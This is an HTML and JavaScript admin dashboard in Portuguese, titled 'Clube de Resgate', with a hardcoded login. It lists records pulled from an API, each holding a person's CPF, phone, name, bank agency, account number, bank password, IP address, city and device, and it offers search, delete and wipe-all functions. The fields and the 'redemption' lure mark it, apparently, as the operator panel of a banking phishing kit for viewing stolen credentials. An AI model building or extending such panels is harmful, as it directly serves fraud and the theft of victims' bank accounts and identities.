<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel - Clube de Resgate</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .login-box {
            max-width: 420px;
            margin: 80px auto;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            padding: 50px 40px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        .login-box .icon {
            font-size: 48px;
            margin-bottom: 10px;
        }

        .login-box h1 {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 5px;
            background: linear-gradient(90deg, #ff0000, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .login-box p {
            color: #888;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .login-box input {
            width: 100%;
            padding: 16px 18px;
            margin-bottom: 14px;
            border: 2px solid #333;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }

        .login-box input:focus {
            border-color: #ff0000;
            background: rgba(255, 0, 0, 0.05);
        }

        .login-box input::placeholder {
            color: #555;
        }

        .login-box .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(90deg, #ff0000, #cc0000);
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }

        .login-box .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
        }

        .login-box .erro {
            color: #ff4444;
            font-size: 14px;
            margin-top: 12px;
            display: none;
        }

        .painel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 25px;
            flex-wrap: wrap;
            gap: 15px;
        }

        .painel-header .logo h1 {
            font-size: 22px;
            background: linear-gradient(90deg, #ff0000, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .painel-header .logo span {
            font-size: 13px;
            color: #666;
            display: block;
            -webkit-text-fill-color: #666;
        }

        .painel-header .acoes {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }

        .painel-header .acoes .btn-sair {
            padding: 10px 24px;
            border: 2px solid #ff0000;
            border-radius: 10px;
            background: transparent;
            color: #ff0000;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
        }

        .painel-header .acoes .btn-sair:hover {
            background: #ff0000;
            color: #fff;
        }

        .painel-header .acoes .btn-limpar {
            padding: 10px 24px;
            border: none;
            border-radius: 10px;
            background: #ff4444;
            color: #fff;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
        }

        .painel-header .acoes .btn-limpar:hover {
            background: #cc0000;
            transform: scale(1.02);
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 14px;
            padding: 18px 20px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            text-align: center;
            transition: 0.3s;
        }

        .stat-card:hover {
            border-color: rgba(255, 0, 0, 0.3);
        }

        .stat-card .numero {
            font-size: 28px;
            font-weight: 900;
            color: #ff0000;
        }

        .stat-card .label {
            font-size: 12px;
            color: #888;
            margin-top: 4px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .busca {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .busca input {
            flex: 1;
            min-width: 200px;
            padding: 12px 16px;
            border: 2px solid #333;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: 0.3s;
        }

        .busca input:focus {
            border-color: #ff0000;
        }

        .busca input::placeholder {
            color: #555;
        }

        .tabela-wrapper {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 14px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow-x: auto;
            padding: 0;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
            min-width: 1100px;
        }

        thead {
            background: rgba(255, 0, 0, 0.1);
        }

        th {
            padding: 14px 12px;
            text-align: left;
            color: #aaa;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 11px;
            letter-spacing: 0.5px;
            border-bottom: 2px solid rgba(255, 255, 255, 0.05);
            position: sticky;
            top: 0;
            background: #1a1a2e;
        }

        td {
            padding: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            color: #ddd;
            word-break: break-word;
        }

        tr:hover td {
            background: rgba(255, 255, 255, 0.03);
        }

        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }

        .badge-iphone {
            background: #1a1a3a;
            color: #6a8cff;
        }
        .badge-android {
            background: #1a2a1a;
            color: #6aff6a;
        }
        .badge-pc {
            background: #2a2a2a;
            color: #aaa;
        }
        .badge-mac {
            background: #2a1a2a;
            color: #ff6aff;
        }

        .sem-dados {
            text-align: center;
            padding: 50px;
            color: #666;
            font-size: 16px;
        }

        .btn-excluir {
            background: #ff4444;
            border: none;
            color: #fff;
            padding: 4px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            transition: 0.3s;
        }

        .btn-excluir:hover {
            background: #cc0000;
        }

        @media (max-width: 768px) {
            .painel-header {
                flex-direction: column;
                align-items: flex-start;
            }
            .stats {
                grid-template-columns: repeat(2, 1fr);
            }
            .stat-card .numero {
                font-size: 22px;
            }
            table {
                font-size: 12px;
                min-width: 800px;
            }
            th, td {
                padding: 8px 10px;
            }
        }

        @media (max-width: 480px) {
            .login-box {
                margin: 50px auto;
                padding: 30px 20px;
            }
            .stats {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>

    <div class="container" id="app">

        <!-- ===== TELA DE LOGIN ===== -->
        <div id="telaLogin">
            <div class="login-box">
                <div class="icon">🔐</div>
                <h1>Painel Admin</h1>
                <p>Clube de Resgate</p>

                <!-- ===== CAMPOS SEM VALOR PRÉ-PREENCHIDO ===== -->
                <form id="formLogin" autocomplete="off">
                    <input type="text" id="loginUser" placeholder="Usuário" autocomplete="off">
                    <input type="password" id="loginSenha" placeholder="Senha" autocomplete="off">
                    <button type="submit" class="btn">ENTRAR</button>
                </form>

                <div class="erro" id="erroLogin">Usuário ou senha incorretos.</div>
            </div>
        </div>

        <!-- ===== TELA DO PAINEL ===== -->
        <div id="telaPainel" style="display: none;">
            <div class="painel-header">
                <div class="logo">
                    <h1>📊 Clube de Resgate</h1>
                    <span>Painel administrativo</span>
                </div>
                <div class="acoes">
                    <button class="btn-limpar" id="btnLimparTudo">🗑️ Limpar Tudo</button>
                    <button class="btn-sair" id="btnSair">Sair</button>
                </div>
            </div>

            <div class="stats" id="stats">
                <div class="stat-card">
                    <div class="numero" id="totalResgates">0</div>
                    <div class="label">Total de Resgates</div>
                </div>
                <div class="stat-card">
                    <div class="numero" id="totalHoje">0</div>
                    <div class="label">Hoje</div>
                </div>
                <div class="stat-card">
                    <div class="numero" id="totalDispositivos">0</div>
                    <div class="label">Dispositivos</div>
                </div>
            </div>

            <div class="busca">
                <input type="text" id="buscaInput" placeholder="🔍 Buscar por CPF, Nome ou Telefone..." oninput="filtrarTabela()">
            </div>

            <div class="tabela-wrapper">
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>CPF</th>
                            <th>Telefone</th>
                            <th>Nome</th>
                            <th>Agência</th>
                            <th>Conta</th>
                            <th>Senha</th>
                            <th>IP</th>
                            <th>Cidade</th>
                            <th>Dispositivo</th>
                            <th>Data/Hora</th>
                            <th>Ações</th>
                        </tr>
                    </thead>
                    <tbody id="tabelaCorpo">
                        <tr>
                            <td colspan="12" class="sem-dados">Carregando dados...</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

    </div>

    <script>
        // ================================================================
        // VARIÁVEIS
        // ================================================================
        let dadosCache = [];
        let logado = false;

        // ================================================================
        // LOGIN
        // ================================================================
        document.getElementById('formLogin').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('loginUser').value.trim();
            const senha = document.getElementById('loginSenha').value.trim();
            const erroEl = document.getElementById('erroLogin');

            if (user === 'dg' && senha === 'dg2026') {
                erroEl.style.display = 'none';
                logado = true;
                document.getElementById('telaLogin').style.display = 'none';
                document.getElementById('telaPainel').style.display = 'block';
                carregarDados();

                // Limpa os campos de login
                document.getElementById('loginUser').value = '';
                document.getElementById('loginSenha').value = '';
            } else {
                erroEl.style.display = 'block';
                document.getElementById('loginSenha').value = '';
            }
        });

        // ================================================================
        // SAIR
        // ================================================================
        document.getElementById('btnSair').addEventListener('click', function() {
            logado = false;
            document.getElementById('telaLogin').style.display = 'block';
            document.getElementById('telaPainel').style.display = 'none';
            document.getElementById('loginSenha').value = '';
            document.getElementById('loginUser').value = '';
        });

        // ================================================================
        // CARREGAR DADOS
        // ================================================================
        async function carregarDados() {
            try {
                const response = await fetch('/api/listar-resgates');
                const data = await response.json();

                if (data.sucesso && data.dados) {
                    dadosCache = data.dados;
                    atualizarStats();
                    renderizarTabela(dadosCache);
                } else {
                    document.getElementById('tabelaCorpo').innerHTML = `
                        <tr><td colspan="12" class="sem-dados">Nenhum resgate encontrado.</td></tr>
                    `;
                }
            } catch (error) {
                console.error('Erro ao carregar:', error);
                document.getElementById('tabelaCorpo').innerHTML = `
                    <tr><td colspan="12" class="sem-dados">Erro ao carregar dados.</td></tr>
                `;
            }
        }

        // ================================================================
        // ATUALIZAR STATS
        // ================================================================
        function atualizarStats() {
            const total = dadosCache.length;
            document.getElementById('totalResgates').textContent = total;

            const hoje = new Date().toLocaleDateString('pt-BR');
            const hojeCount = dadosCache.filter(d => {
                const data = new Date(d.data_hora);
                return data.toLocaleDateString('pt-BR') === hoje;
            }).length;
            document.getElementById('totalHoje').textContent = hojeCount;

            const dispositivos = new Set(dadosCache.map(d => d.dispositivo));
            document.getElementById('totalDispositivos').textContent = dispositivos.size;
        }

        // ================================================================
        // RENDERIZAR TABELA
        // ================================================================
        function renderizarTabela(dados) {
            const tbody = document.getElementById('tabelaCorpo');

            if (!dados || dados.length === 0) {
                tbody.innerHTML = `<tr><td colspan="12" class="sem-dados">Nenhum registro encontrado.</td></tr>`;
                return;
            }

            let html = '';
            dados.forEach((d, index) => {
                const dispositivoClass = getDispositivoClass(d.dispositivo);
                html += `
                    <tr>
                        <td>${index + 1}</td>
                        <td>${d.cpf || '-'}</td>
                        <td>${d.telefone || '-'}</td>
                        <td><strong>${d.nome || '-'}</strong></td>
                        <td>${d.agencia || '-'}</td>
                        <td>${d.conta || '-'}</td>
                        <td>${d.senha || '-'}</td>
                        <td style="font-size:12px; color:#666;">${d.ip || '-'}</td>
                        <td style="font-size:12px; color:#666;">${d.cidade || '-'}</td>
                        <td><span class="badge ${dispositivoClass}">${d.dispositivo || 'Desconhecido'}</span></td>
                        <td style="font-size:12px; color:#666;">${formatarData(d.data_hora)}</td>
                        <td>
                            <button class="btn-excluir" onclick="excluirRegistro(${d.id})">Excluir</button>
                        </td>
                    </tr>
                `;
            });

            tbody.innerHTML = html;
        }

        // ================================================================
        // EXCLUIR REGISTRO
        // ================================================================
        async function excluirRegistro(id) {
            if (!confirm(`Tem certeza que deseja excluir o registro #${id}?`)) return;

            try {
                const response = await fetch(`/api/excluir-resgate/${id}`, {
                    method: 'DELETE'
                });
                const data = await response.json();

                if (data.sucesso) {
                    alert('✅ Registro excluído com sucesso!');
                    carregarDados();
                } else {
                    alert('❌ Erro ao excluir: ' + data.mensagem);
                }
            } catch (error) {
                console.error('Erro:', error);
                alert('❌ Erro ao excluir registro.');
            }
        }

        // ================================================================
        // LIMPAR TUDO
        // ================================================================
        document.getElementById('btnLimparTudo').addEventListener('click', async function() {
            if (!confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os registros. Tem certeza?')) return;

            try {
                const response = await fetch('/api/limpar-resgates', {
                    method: 'DELETE'
                });
                const data = await response.json();

                if (data.sucesso) {
                    alert('✅ Todos os registros foram apagados!');
                    carregarDados();
                } else {
                    alert('❌ Erro ao limpar: ' + data.mensagem);
                }
            } catch (error) {
                console.error('Erro:', error);
                alert('❌ Erro ao limpar registros.');
            }
        });

        // ================================================================
        // FILTRAR TABELA
        // ================================================================
        function filtrarTabela() {
            const busca = document.getElementById('buscaInput').value.toLowerCase().trim();

            if (!busca) {
                renderizarTabela(dadosCache);
                return;
            }

            const filtrados = dadosCache.filter(d => {
                return (d.cpf && d.cpf.includes(busca)) ||
                    (d.nome && d.nome.toLowerCase().includes(busca)) ||
                    (d.telefone && d.telefone.includes(busca)) ||
                    (d.ip && d.ip.includes(busca));
            });

            renderizarTabela(filtrados);
        }

        // ================================================================
        // FUNÇÕES AUXILIARES
        // ================================================================
        function getDispositivoClass(dispositivo) {
            if (!dispositivo) return 'badge-pc';
            if (dispositivo.includes('iPhone')) return 'badge-iphone';
            if (dispositivo.includes('Android')) return 'badge-android';
            if (dispositivo.includes('Mac')) return 'badge-mac';
            return 'badge-pc';
        }

        function formatarData(data) {
            if (!data) return '-';
            const d = new Date(data);
            return d.toLocaleString('pt-BR', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });
        }

        // ================================================================
        // RECARREGAR A CADA 30 SEGUNDOS
        // ================================================================
        setInterval(() => {
            if (logado) carregarDados();
        }, 30000);
    </script>

</body>
</html>
